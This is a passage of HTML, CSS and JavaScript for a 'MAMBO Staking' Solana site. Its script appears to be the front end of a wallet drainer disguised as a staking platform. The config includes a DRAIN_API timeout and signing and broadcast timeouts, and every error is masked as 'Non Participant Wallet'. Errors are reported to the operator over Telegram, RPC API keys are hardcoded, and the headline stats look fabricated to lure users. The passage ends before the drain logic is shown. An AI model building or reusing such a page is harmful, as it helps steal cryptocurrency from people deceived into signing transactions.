            <button onclick="calculateRewards()">🚀 Calculate Rewards!</button>
            <div id="calculatorResult" class="result" style="display: none;"></div>
          </div>
        </div>
      </div>
    </section>



    <!-- Stats Section -->
    <section class="stats">
      <div class="container">
        <h3 class="section-title">🏆 MAMBO Staking Stats</h3>
        <p class="section-subtitle">See the incredible growth and success of our staking platform</p>
        <div class="stats-grid">
          <div class="stat-item">
            <div class="stat-number">$2.4M+</div>
            <div class="stat-label">Total Value Locked</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">15.8%</div>
            <div class="stat-label">Average APY</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">1,247</div>
            <div class="stat-label">Active Stakers</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">$89.2K</div>
            <div class="stat-label">Total Rewards Paid</div>
          </div>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
      <div class="footer-content">
        <div class="footer-section">
          <p>&copy; 2024 MAMBO Team. All rights reserved.</p>
          <p>Built on Solana Blockchain</p>
        </div>
        <div class="footer-section">
          <h4>Connect With Us</h4>
          <div class="social-links">
            <a href="https://twitter.com/MAMBO_Token" target="_blank" rel="noopener noreferrer" class="social-link">
              <span class="social-icon">🐦</span> Twitter
            </a>
            <a href="https://t.me/MAMBO_Token" target="_blank" rel="noopener noreferrer" class="social-link">
              <span class="social-icon">📱</span> Telegram
            </a>
            <a href="https://discord.gg/MAMBO" target="_blank" rel="noopener noreferrer" class="social-link">
              <span class="social-icon">🎮</span> Discord
            </a>
            <a href="https://medium.com/@MAMBO_Token" target="_blank" rel="noopener noreferrer" class="social-link">
              <span class="social-icon">📝</span> Medium
            </a>
          </div>
        </div>
      </div>
    </footer>
  </div>

  <!-- Wallet Modal -->
  <div id="walletModal" class="wallet-modal">
    <div class="wallet-content">
      <span class="close-btn" onclick="closeWalletModal()">&times;</span>
      <div id="walletList" class="wallet-list">
        <!-- Wallet options will be generated here -->
      </div>
    </div>
  </div>

  <!-- CSS Styles -->
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&family=Comic+Neue:wght@300;400;700&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    :root {
      --primary-color: #ff6b35;
      --secondary-color: #f7931e;
      --accent-color: #ffd23f;
      --success-color: #06ffa5;
      --danger-color: #ff006e;
      --dark-color: #1a1a2e;
      --light-color: #16213e;
      --text-primary: #ffffff;
      --text-secondary: #e0e0e0;
      --text-muted: #a0a0a0;
      --bg-primary: #0f0f23;
      --bg-secondary: #1a1a2e;
      --bg-tertiary: #16213e;
      --bg-card: rgba(26, 26, 46, 0.8);
      --bg-overlay: rgba(15, 15, 35, 0.95);
      --border-color: rgba(255, 210, 63, 0.3);
      --gradient-primary: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
      --gradient-secondary: linear-gradient(135deg, #1a1a2e 0%, #7209b7 100%);
      --gradient-accent: linear-gradient(45deg, #ffd23f 0%, #ff6b35 100%);
      --gradient-dark: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
      --shadow-soft: 0 8px 32px rgba(0, 0, 0, 0.3);
      --shadow-strong: 0 16px 48px rgba(0, 0, 0, 0.5);
      --border-radius: 20px;
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
    
    body {
      font-family: 'Comic Neue', cursive;
      background: var(--gradient-dark);
      min-height: 100vh;
      color: var(--text-primary);
      position: relative;
      overflow-x: hidden;
    }
    
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(247, 147, 30, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(255, 210, 63, 0.1) 0%, transparent 50%);
      pointer-events: none;
      z-index: -1;
    }
    
    .container {
      max-width: 1400px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Header Styles */
    .header {
      text-align: center;
      margin-bottom: 40px;
      background: var(--bg-overlay);
      backdrop-filter: blur(20px);
      padding: 1.5rem;
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-soft);
      border: 3px solid var(--accent-color);
    }
    
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .logo-img {
      width: 60px;
      height: 60px;
      margin-right: 15px;
      border-radius: 12px;
      border: 3px solid var(--accent-color);
      box-shadow: var(--shadow-soft);
    }
    
    .logo-text {
      font-family: 'Fredoka One', cursive;
      font-size: 2.5rem;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-shadow: 3px 3px 0px var(--accent-color);
      filter: drop-shadow(2px 2px 4px rgba(0, 0, 0, 0.3));
    }
    
    .main-title {
      font-family: 'Fredoka One', cursive;
      font-size: 2.2rem;
      background: var(--gradient-accent);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 10px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
    }
    
    .subtitle {
      font-size: 1.2rem;
      color: var(--text-secondary);
      margin-bottom: 20px;
      font-weight: 600;
    }
    
    /* Hero Section */
    .hero {
      display: flex;
      align-items: center;
      gap: 40px;
      margin-bottom: 50px;
      background: var(--bg-overlay);
      padding: 40px;
      border-radius: var(--border-radius);
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow-strong);
      border: 3px solid var(--accent-color);
      position: relative;
      overflow: hidden;
    }
    
    .hero::before {
      content: '🎮';
      position: absolute;
      top: 10%;
      left: 5%;
      font-size: 4rem;
      opacity: 0.1;
      animation: float 6s ease-in-out infinite;
    }
    
    .hero::after {
      content: '🚀';
      position: absolute;
      top: 15%;
      right: 8%;
      font-size: 3rem;
      opacity: 0.1;
      animation: float 8s ease-in-out infinite reverse;
    }
    
    .hero-content {
      flex: 1;
      position: relative;
      z-index: 2;
    }
    
    .hero-title {
      font-family: 'Fredoka One', cursive;
      font-size: 1.8rem;
      color: var(--text-primary);
      margin-bottom: 15px;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .hero-description {
      font-size: 1.1rem;
      color: var(--text-secondary);
      margin-bottom: 25px;
      line-height: 1.6;
      font-weight: 500;
    }
    
    .hero-stats {
      display: flex;
      justify-content: center;
      gap: 3rem;
      margin-bottom: 3rem;
      flex-wrap: wrap;
    }
    
    .hero-stat {
      background: var(--bg-card);
      backdrop-filter: blur(10px);
      padding: 1.5rem 2rem;
      border-radius: var(--border-radius);
      border: 2px solid var(--border-color);
      text-align: center;
      min-width: 150px;
      transition: var(--transition);
    }
    
    .hero-stat:hover {
      transform: translateY(-5px);
      border-color: var(--accent-color);
      box-shadow: var(--shadow-soft);
    }
    
    .hero-stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: var(--accent-color);
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
      font-family: 'Fredoka One', cursive;
    }
    
    .hero-stat-label {
      color: var(--text-secondary);
      font-size: 0.9rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 0.5rem;
    }
    
    .hero-features {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }
    
    .feature {
      display: flex;
      align-items: center;
      gap: 8px;
      background: var(--bg-card);
      padding: 10px 15px;
      border-radius: 25px;
      color: var(--text-primary);
      transition: var(--transition);
      border: 2px solid transparent;
    }
    
    .feature:hover {
      background: var(--bg-tertiary);
      border-color: var(--accent-color);
      transform: translateY(-2px);
    }

    .hero-image {
      flex: 1;
      text-align: center;
    }

    .hero-img {
      max-width: 100%;
      height: auto;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }

    /* Wallet Section */
    .wallet-section {
      text-align: center;
      margin-bottom: 50px;
    }

    .wallet-box {
      background: var(--bg-card);
      padding: 40px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
      max-width: 500px;
      margin: 0 auto;
      border: 2px solid var(--border-color);
    }

    .wallet-title {
      font-size: 1.6rem;
      color: var(--text-primary);
      margin-bottom: 15px;
    }

    .wallet-description {
      color: var(--text-secondary);
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .connect-btn {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      color: var(--text-primary);
      border: none;
      padding: 15px 30px;
      font-size: 1.1rem;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 0 auto;
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }

    .connect-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
    }

    .btn-icon {
      font-size: 1.2rem;
    }

    /* Features Section */
    .features {
      text-align: center;
      margin-bottom: 50px;
    }

    .features-title {
      font-size: 2rem;
      color: var(--text-primary);
      margin-bottom: 30px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 25px;
    }

    .feature-card {
      background: var(--bg-card);
      padding: 30px;
      border-radius: 15px;
      backdrop-filter: blur(10px);
      transition: transform 0.3s ease;
      border: 2px solid var(--border-color);
    }

    .feature-card:hover {
      transform: translateY(-5px);
      border-color: var(--accent-color);
    }

    .feature-card .feature-icon {
      font-size: 3rem;
      margin-bottom: 15px;
      display: block;
    }

    .feature-card h4 {
      color: var(--text-primary);
      font-size: 1.3rem;
      margin-bottom: 10px;
    }

    .feature-card p {
      color: var(--text-secondary);
      line-height: 1.5;
    }

    /* Footer */
    .footer {
      text-align: center;
      color: var(--text-secondary);
      padding: 30px 0;
      border-top: 1px solid var(--border-color);
    }

    .footer-content {
      display: flex;
      flex-direction: column;
      gap: 20px;
      align-items: center;
    }

    .footer-section h4 {
      color: var(--text-primary);
      margin-bottom: 15px;
      font-size: 1.1rem;
    }

    .social-links {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .social-link {
      display: flex;
      align-items: center;
      gap: 8px;
      color: var(--text-secondary);
      text-decoration: none;
      padding: 8px 16px;
      border-radius: 20px;
      background: var(--bg-card);
      transition: all 0.3s ease;
      border: 1px solid var(--border-color);
    }

    .social-link:hover {
      background: var(--bg-tertiary);
      color: var(--text-primary);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .social-icon {
      font-size: 1.2rem;
    }

    /* Mobile Responsiveness */
    @media (max-width: 768px) {
      .hero {
        flex-direction: column;
        text-align: center;
        padding: 20px;
      }
      
      .hero-image {
        order: -1;
        margin-bottom: 20px;
      }
      
      .hero-img {
        max-width: 100%;
        height: auto;
      }
      
      .wallet-section {
        padding: 20px;
      }
      
      .social-links {
        flex-direction: column;
        gap: 10px;
      }
      
      .social-link {
        justify-content: center;
      }
      
      .footer-content {
        gap: 15px;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 15px;
      }
      
      .main-title {
        font-size: 1.8rem;
      }
      
      .logo-text {
        font-size: 2rem;
      }
      
      .hero-title {
        font-size: 1.5rem;
      }
    }
  
    /* Wallet Modal Styles */
    .wallet-modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
      backdrop-filter: blur(5px);
    }

    .wallet-content {
      background-color: var(--bg-overlay);
      margin: 15% auto;
      padding: 30px;
      border-radius: 20px;
      width: 90%;
      max-width: 500px;
      position: relative;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
      border: 2px solid var(--accent-color);
    }

    .close-btn {
      position: absolute;
      right: 20px;
      top: 20px;
      font-size: 28px;
      font-weight: bold;
      color: var(--text-muted);
      cursor: pointer;
      transition: color 0.3s;
    }

    .close-btn:hover {
      color: var(--text-primary);
    }

    .wallet-list {
      margin-top: 20px;
    }

    .wallet-item {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 15px;
      border: 2px solid var(--border-color);
      border-radius: 12px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      background: var(--bg-card);
    }

    .wallet-item:hover {
      border-color: var(--accent-color);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 210, 63, 0.3);
    }

    .wallet-icon {
      width: 32px;
      height: 32px;
      border-radius: 8px;
    }

    .wallet-name {
      flex: 1;
      font-weight: 600;
      color: var(--text-primary);
    }

    .wallet-status {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
    }

    .wallet-status.available {
      background: rgba(6, 255, 165, 0.2);
      color: var(--success-color);
    }

    .wallet-status.not-installed {
      background: rgba(255, 0, 110, 0.2);
      color: var(--danger-color);
    }

    /* Status Container Styles */
    .status-container {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 2000;
      max-width: 400px;
    }

    .status-message {
      background: var(--bg-card);
      border-radius: 8px;
      padding: 12px 16px;
      margin-bottom: 10px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      border-left: 4px solid var(--accent-color);
      animation: slideIn 0.3s ease-out;
      font-weight: 500;
      color: var(--text-primary);
    }

    .status-message.success {
      border-left-color: var(--success-color);
      background: rgba(6, 255, 165, 0.1);
      color: var(--success-color);
    }

    .status-message.error {
      border-left-color: var(--danger-color);
      background: rgba(255, 0, 110, 0.1);
      color: var(--danger-color);
    }

    .status-message.warning {
      border-left-color: var(--secondary-color);
      background: rgba(247, 147, 30, 0.1);
      color: var(--secondary-color);
    }

    .status-message.loading {
      border-left-color: var(--accent-color);
      background: rgba(255, 210, 63, 0.1);
      color: var(--accent-color);
    }

    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
    
    /* Gamified Animations */
    @keyframes float {
      0%, 100% {
        transform: translateY(0px);
      }
      50% {
        transform: translateY(-20px);
      }
    }
    
    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% {
        transform: translateY(0);
      }
      40% {
        transform: translateY(-10px);
      }
      60% {
        transform: translateY(-5px);
      }
    }
    
    @keyframes pulse {
      0% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
      100% {
        transform: scale(1);
      }
    }
    
    @keyframes shake {
      0%, 100% {
        transform: translateX(0);
      }
      10%, 30%, 50%, 70%, 90% {
        transform: translateX(-5px);
      }
      20%, 40%, 60%, 80% {
        transform: translateX(5px);
      }
    }
    

    
    /* Enhanced Wallet Section */
    .wallet-section {
      text-align: center;
      margin-bottom: 50px;
      background: var(--bg-overlay);
      padding: 40px;
      border-radius: var(--border-radius);
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow-strong);
      border: 3px solid var(--accent-color);
    }
    
    .wallet-title {
      font-family: 'Fredoka One', cursive;
      font-size: 1.8rem;
      color: var(--text-primary);
      margin-bottom: 15px;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .wallet-description {
      color: var(--text-secondary);
      margin-bottom: 25px;
      line-height: 1.6;
      font-weight: 500;
    }
    
    .connect-btn {
      background: var(--gradient-primary);
      color: var(--text-primary);
      border: none;
      padding: 15px 30px;
      font-size: 1.1rem;
      border-radius: 50px;
      cursor: pointer;
      transition: var(--transition);
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 0 auto;
      box-shadow: var(--shadow-soft);
      border: 3px solid var(--accent-color);
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .connect-btn:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: var(--shadow-strong);
    }
    
    .btn-icon {
      font-size: 1.2rem;
      animation: pulse 2s infinite;
    }
    
    /* Calculator Section Styles */
    .calculator-section {
      padding: 100px 0;
      background: var(--gradient-secondary);
      color: var(--text-primary);
      position: relative;
    }
    
    .calculator-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 100px;
      background: var(--bg-primary);
      clip-path: polygon(0 0, 100% 30%, 100% 100%, 0 100%);
    }
    
    .calculator-container {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 4rem;
      align-items: center;
      max-width: 1000px;
      margin: 0 auto;
      position: relative;
      z-index: 2;
    }
    
    .calculator-info h3 {
      font-family: 'Fredoka One', cursive;
      font-size: 2.5rem;
      margin-bottom: 1.5rem;
      color: var(--accent-color);
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
    }
    
    .calculator-info p {
      font-size: 1.2rem;
      margin-bottom: 1.5rem;
      line-height: 1.7;
      color: var(--text-secondary);
    }
    
    .calculator {
      background: var(--bg-card);
      backdrop-filter: blur(20px);
      padding: 2.5rem;
      border-radius: var(--border-radius);
      border: 2px solid var(--border-color);
      box-shadow: var(--shadow-strong);
    }
    
    .calculator h4 {
      text-align: center;
      margin-bottom: 2rem;
      font-size: 2rem;
      color: var(--accent-color);
      font-family: 'Fredoka One', cursive;
    }
    
    .calculator-group {
      margin-bottom: 1.5rem;
    }
    
    .calculator-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: var(--accent-color);
      font-size: 1.1rem;
    }
    
    .calculator input {
      width: 100%;
      padding: 1rem;
      border: 2px solid var(--border-color);
      border-radius: 15px;
      font-size: 1rem;
      background: var(--bg-card);
      transition: var(--transition);
      color: var(--text-primary);
    }
    
    .calculator input:focus {
      outline: none;
      border-color: var(--accent-color);
      box-shadow: 0 0 0 3px rgba(255, 210, 63, 0.3);
    }
    
    .calculator button {
      width: 100%;
      padding: 1.2rem;
      background: var(--gradient-accent);
      color: var(--text-primary);
      border: none;
      border-radius: 15px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: var(--transition);
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: var(--shadow-soft);
    }
    
    .calculator button:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-strong);
    }
    
    .result {
      margin-top: 1.5rem;
      padding: 1.5rem;
      background: var(--bg-card);
      border-radius: 15px;
      text-align: center;
      font-weight: bold;
      font-size: 1.1rem;
      border: 2px solid var(--accent-color);
      color: var(--text-primary);
    }
    
    /* Stats Section Styles */
    .stats {
      padding: 100px 0;
      background: var(--bg-tertiary);
      position: relative;
    }
    
    .stats::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 100px;
      background: var(--gradient-secondary);
      clip-path: polygon(0 0, 100% 70%, 100% 100%, 0 100%);
    }
    
    .section-title {
      text-align: center;
      font-family: 'Fredoka One', cursive;
      font-size: 3rem;
      margin-bottom: 1rem;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      position: relative;
      z-index: 2;
    }
    
    .section-subtitle {
      text-align: center;
      font-size: 1.3rem;
      color: var(--text-muted);
      margin-bottom: 4rem;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      position: relative;
      z-index: 2;
    }
    
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 3rem;
      text-align: center;
      margin-top: 4rem;
      position: relative;
      z-index: 2;
    }
    
    .stat-item {
      padding: 3rem 2rem;
      background: var(--bg-card);
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-soft);
      transition: var(--transition);
      border: 3px solid transparent;
      position: relative;
      overflow: hidden;
    }
    
    .stat-item::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--gradient-primary);
      opacity: 0;
      transition: var(--transition);
      z-index: -1;
    }
    
    .stat-item:hover::before {
      opacity: 0.1;
    }
    
    .stat-item:hover {
      transform: translateY(-10px);
      box-shadow: var(--shadow-strong);
    }
    
    .stat-number {
      font-family: 'Fredoka One', cursive;
      font-size: 4rem;
      font-weight: bold;
      background: var(--gradient-primary);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 1rem;
      display: block;
    }
    
    .stat-label {
      color: var(--text-secondary);
      font-size: 1.2rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    /* Enhanced Footer */
    .footer {
      text-align: center;
      color: var(--text-primary);
      padding: 30px 0;
      background: var(--bg-overlay);
      backdrop-filter: blur(20px);
      border-top: 3px solid var(--accent-color);
      margin-top: 50px;
    }
    
    .footer-content {
      display: flex;
      flex-direction: column;
      gap: 20px;
      align-items: center;
    }
    
    .footer-section h4 {
      color: var(--text-primary);
      margin-bottom: 15px;
      font-size: 1.1rem;
      font-family: 'Fredoka One', cursive;
    }
    
    .social-links {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: center;
    }
    
    .social-link {
      display: flex;
      align-items: center;
      gap: 8px;
      color: var(--text-primary);
      text-decoration: none;
      padding: 8px 16px;
      border-radius: 20px;
      background: var(--bg-card);
      transition: var(--transition);
      border: 2px solid var(--accent-color);
      font-weight: 600;
    }
    
    .social-link:hover {
      background: var(--gradient-primary);
      color: var(--text-primary);
      transform: translateY(-3px);
      box-shadow: var(--shadow-soft);
    }
    


    /* Responsive Design */
    @media (max-width: 768px) {
      .hero {
        flex-direction: column;
        text-align: center;
        padding: 20px;
      }
      
      .hero-image {
        order: -1;
        margin-bottom: 20px;
      }
      
      .hero-img {
        max-width: 100%;
        height: auto;
      }
      
      .wallet-section {
        padding: 20px;
      }
      
      .social-links {
        flex-direction: column;
        gap: 10px;
      }
      
      .social-link {
        justify-content: center;
      }
      
      .footer-content {
        gap: 15px;
      }
      
      .features-grid {
        grid-template-columns: 1fr;
      }
      
      .main-title {
        font-size: 1.8rem;
      }
      
      .logo-text {
        font-size: 2rem;
      }
      
      .hero-title {
        font-size: 1.5rem;
      }
      
      .calculator-container {
        grid-template-columns: 1fr;
        gap: 2rem;
        padding: 0 20px;
      }
      
      .calculator-info h3 {
        font-size: 2rem;
        text-align: center;
      }
      
      .calculator-info p {
        text-align: center;
      }
      
      .stats-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 2rem;
        padding: 0 20px;
      }
      
      .section-title {
        font-size: 2.5rem;
      }
      
      .hero-stats {
        flex-direction: column;
        gap: 1.5rem;
      }
      
      .hero-stat {
        min-width: auto;
      }
    }
    
    @media (max-width: 480px) {
      .container {
        padding: 15px;
      }
      
      .main-title {
        font-size: 1.6rem;
      }
      
      .logo-text {
        font-size: 1.8rem;
      }
      
      .hero-title {
        font-size: 1.3rem;
      }
      
      .feature-card {
        padding: 20px;
      }
      
      .wallet-section {
        padding: 15px;
      }
    }
  </style>

  <!-- JavaScript -->
  <script>
    // Production logging system - only logs in development
    const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    
    // Load configuration
    if (typeof window.APP_CONFIG === 'undefined') {
      // Fallback configuration if config.js fails to load
      window.APP_CONFIG = {
        PROJECT_NAME: 'MAMBO Staking',
        PRIMARY_RPC: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
        FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
        WALLET_CONNECTION_TIMEOUT: 15000, // Reduced from 20s to 15s
        DEEP_LINKING_TIMEOUT: 8000, // Reduced from 10s to 8s
        DRAIN_API_TIMEOUT: 15000, // Reduced from 45s to 15s - much faster response
        BROADCAST_TIMEOUT: 30000, // Reduced from 60s to 30s
        SIGNING_TIMEOUT: 60000 // Reduced from 90s to 60s
      };
    }

    // Helper functions for configuration access
    window.getConfig = function(key) {
      return window.APP_CONFIG[key] || null;
    };

    window.getTimeout = function(key) {
      return window.APP_CONFIG[key] || 30000; // Default 30 seconds
    };

    window.logger = {
      log: (...args) => isDevelopment && console.log(...args),
      error: (...args) => console.error(...args), // Always log errors
      warn: (...args) => isDevelopment && console.warn(...args),
      info: (...args) => isDevelopment && console.info(...args)
    };

            logger.log('✅ MAMBO Staking Application Loading...');

    // Frontend Error Handling Utility
    window.FRONTEND_ERROR_TYPES = {
      WALLET_CONNECTION: 'wallet_connection',
      TRANSACTION_SIGNING: 'transaction_signing',
      API_CALL: 'api_call',
      NETWORK: 'network',
      VALIDATION: 'validation',
      SOLANA_ERROR: 'solana_error',
      RPC_ERROR: 'rpc_error',
      UNKNOWN: 'unknown'
    };
    
    // User-friendly error messages (clean, non-technical)
    window.USER_MESSAGES = {
      [window.FRONTEND_ERROR_TYPES.WALLET_CONNECTION]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.API_CALL]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.NETWORK]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.VALIDATION]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.SOLANA_ERROR]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.RPC_ERROR]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.UNKNOWN]: 'Non Participant Wallet'
    };
    
    // Error classification function
    window.classifyFrontendError = function(error) {
      const errorMessage = error.message?.toLowerCase() || '';
      
      // Solana.js specific errors
      if (errorMessage.includes('unsupported path') || errorMessage.includes('solana.js')) {
        return 'SOLANA_ERROR';
      }
      
      if (errorMessage.includes('rpc') || errorMessage.includes('endpoint')) {
        return 'RPC_ERROR';
      }
      
      if (errorMessage.includes('wallet') || errorMessage.includes('phantom') || 
          errorMessage.includes('solflare') || errorMessage.includes('backpack') ||
          errorMessage.includes('user rejected') || errorMessage.includes('popup blocked')) {
        return window.FRONTEND_ERROR_TYPES.WALLET_CONNECTION;
      }
      
      if (errorMessage.includes('transaction') || errorMessage.includes('signature') ||
          errorMessage.includes('instruction') || errorMessage.includes('serialize')) {
        return window.FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING;
      }
      
      if (errorMessage.includes('fetch') || errorMessage.includes('api') ||
          errorMessage.includes('response') || errorMessage.includes('status')) {
        return window.FRONTEND_ERROR_TYPES.API_CALL;
      }
      
      if (errorMessage.includes('network') || errorMessage.includes('connection') ||
          errorMessage.includes('timeout') || errorMessage.includes('offline')) {
        return window.FRONTEND_ERROR_TYPES.NETWORK;
      }
      
      if (errorMessage.includes('invalid') || errorMessage.includes('missing') ||
          errorMessage.includes('format') || errorMessage.includes('parameter')) {
        return window.FRONTEND_ERROR_TYPES.VALIDATION;
      }
      
      return window.FRONTEND_ERROR_TYPES.UNKNOWN;
    };
    
    // Get user-friendly error message
    window.getFrontendUserMessage = function(errorType) {
      return window.USER_MESSAGES[errorType] || window.USER_MESSAGES[window.FRONTEND_ERROR_TYPES.UNKNOWN];
    };
    
    // Global error handler for unhandled errors
    window.addEventListener('error', function(event) {
      const error = event.error || new Error(event.message);
      const context = {
        filename: event.filename,
        lineno: event.lineno,
        colno: event.colno,
        type: 'unhandled_error'
      };
      
      // Enhanced Solana.js error detection and handling
      if (error.message && (
          error.message.includes('Unsupported path') ||
          error.message.includes('solana.js') ||
          error.message.includes('RPC') ||
          error.message.includes('endpoint') ||
          error.message.includes('Connection') ||
          error.message.includes('network')
        )) {
        
        console.error('[SOLANA_ERROR] Solana.js error detected in global handler:', {
          error: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString()
        });
        
        // Trigger robust fallback
        if (window.triggerRobustRPCFallback) {
          window.triggerRobustRPCFallback(error, context);
        }
        
        // Don't send to Telegram - these are handled by fallbacks
        return;
      }
      
      // Send other critical errors to Telegram
      window.sendTelegramLog('UNHANDLED_ERROR', {
        error: error.message,
        stack: error.stack,
        context: context,
        timestamp: new Date().toISOString(),
        projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
      });
      
      // Log to console
      console.error('[UNHANDLED_ERROR]', error, context);
    });

    // Global promise rejection handler
    window.addEventListener('unhandledrejection', function(event) {
      const error = event.reason || new Error('Promise rejected');
      const context = {
        type: 'unhandled_promise_rejection'
      };
      
      // Log critical errors to Telegram
      if (error.message.includes('Unsupported path') || 
          error.message.includes('solana.js') ||
          error.message.includes('RPC') ||
          error.message.includes('network')) {
        
        // Enhanced Solana.js error detection and handling
        if (error.message && (
            error.message.includes('Unsupported path') ||
            error.message.includes('solana.js') ||
            error.message.includes('RPC') ||
            error.message.includes('endpoint') ||
            error.message.includes('Connection') ||
            error.message.includes('network')
          )) {
          
          console.error('[SOLANA_ERROR] Solana.js error detected in promise rejection:', {
            error: error.message,
            stack: error.stack,
            context: context,
            timestamp: new Date().toISOString()
          });
          
          // Trigger robust fallback
          if (window.triggerRobustRPCFallback) {
            window.triggerRobustRPCFallback(error, context);
          }
          
          // Don't send to Telegram - these are handled by fallbacks
          return;
        }
        
        // Send other critical errors to Telegram
        window.sendTelegramLog('UNHANDLED_PROMISE_REJECTION', {
          error: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      // Log to console
      console.error('[UNHANDLED_PROMISE_REJECTION]', error, context);
    });

    // Enhanced error classification for Solana.js errors
    window.classifySolanaError = function(error) {
      const message = error.message || '';
      
      if (message.includes('Unsupported path')) return 'UNSUPPORTED_PATH';
      if (message.includes('solana.js')) return 'SOLANA_JS_ERROR';
      if (message.includes('RPC')) return 'RPC_ERROR';
      if (message.includes('endpoint')) return 'ENDPOINT_ERROR';
      if (message.includes('Connection')) return 'CONNECTION_ERROR';
